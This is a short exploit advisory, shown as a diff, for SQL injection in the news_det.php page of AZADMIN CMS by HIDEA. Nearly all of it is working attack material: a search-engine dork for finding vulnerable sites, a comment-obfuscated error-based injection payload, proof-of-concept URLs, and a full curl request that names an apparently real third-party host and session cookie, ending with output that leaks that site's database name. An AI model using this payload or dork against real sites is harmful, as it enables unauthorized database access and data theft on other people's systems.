@@ -1,0 +1,35 @@
+[+] Sql Injection on AZADMIN CMS of HIDEA v1.0
+
+[+] Date: 24/06/2019
+
+[+] CWE Number : CWE-89
+
+[+] Risk: High
+
+[+] Author: Felipe Andrian Peixoto
+
+[+] Vendor Homepage: https://www.hidea.com/
+
+[+] Contact: felipe_andrian@hotmail.com
+
+[+] Tested on: Windows 7 and Linux
+
+[+] Vulnerable Files: news_det.php
+
+[+] Dork : inurl:"news_det.php?cod=" HIDEA
+
+[+] Exploit : https://www.site.com/news_det.php?cod=[SQL Injection] 
+
+[+] Payload : /*!50000and*/+/*!50000extractvalue*/(0x0a,/*!50000concat*/(0x0a,0x73337830753a,(/*!50000select*/%20database()),0x3a7333783075))--+-
+
+[+] PoC:
+         http://site.com/news_det.php?cod=-1/*!50000and*/+/*!50000extractvalue*/(0x0a,/*!50000concat*/(0x0a,0x73337830753a,(/*!50000select*/%20database()),0x3a7333783075))--+-
+    
+        https://site.com/news_det.php?cod=77/*!50000and*/+/*!50000extractvalue*/(0x0a,/*!50000concat*/(0x0a,0x73337830753a,(/*!50000select*/%20database()),0x3a7333783075))--+-
+
+[+] Example:
+
+       curl 'http://site.com/news_det.php?cod=-1/*!50000and*/+/*!50000extractvalue*/(0x0a,/*!50000concat*/(0x0a,0x73337830753a,(/*!50000select*/%20database()),0x3a7333783075))--+-' -H 'Host: www.centroconcept.com.br' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3' --compressed -H 'Cookie: PHPSESSID=dv0rd3b6rbghah80getonfp601' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1'
+
+		XPATH syntax error: '
+		s3x0u:centroco_ger:s3x0u'
